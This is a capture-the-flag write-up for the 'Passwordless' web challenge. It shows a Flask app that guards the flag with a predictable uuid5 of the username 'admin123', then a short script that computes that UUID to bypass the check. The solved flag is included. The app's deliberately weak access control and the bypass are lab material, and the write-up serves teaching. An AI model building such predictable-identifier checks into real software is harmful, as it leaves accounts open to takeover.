# Passwordless

![](../images/passwordless-part-1.png)

Download files. `app.py` contains:
```txt
#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import subprocess
import urllib
import uuid
global leet

app = Flask(__name__)
flag = open('/flag.txt').read()
leet=uuid.UUID('13371337-1337-1337-1337-133713371337')

@app.route('/',methods=['GET','POST'])
def main():
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.values['username']
        if username == 'admin123':
            return 'Stop trying to act like you are the admin!'
        uid = uuid.uuid5(leet,username) # super secure!
        return redirect(f'/{uid}')

@app.route('/<uid>')
def user_page(uid):
    if uid != str(uuid.uuid5(leet,'admin123')):
        return f'Welcome! No flag for you :('
    else:
        return flag

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```
Click on link, which takes to this website:

![](../images/passwordless-part-2.png)
 
If a type “a”

![](../images/passwordless-part-3.png)


The url is 
` 24.199.110.35:40150/8a406be5-22f6-5340-9491-03cf301dcfdf`


Simply create a uuid for admin123.  This is the key ` uid = uuid.uuid5(leet,username)`. 
```txt
def user_page(uid):
    if uid != str(uuid.uuid5(leet,'admin123')):
        return f'Welcome! No flag for you :('
    else:
        return flag
```
If the uid doesn’t equal (leet,’admin123’), no flag will be sent. However, if the `username == admin123`, the page will send ‘Stop trying to act like you are the admin!”. All we need to do is make a python script that prints out the uid for admin123 along with the leet. The leet of ` leet=uuid.UUID('13371337-1337-1337-1337-133713371337')` is given. So I create this python script:
```txt
import uuid
leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
uid = str(uuid.uuid5(leet,'admin123'))
print(uid)
```
I then run it, which results in 
```txt
3c68e6cc-15a7-59d4-823c-e7563bbb326c
```
I then change the url to ` 24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c`
Which results in:

![](../images/passwordless-part-4.png)

I then submit ` n00bz{1337-13371337-1337-133713371337-1337}` and solve the challenge.

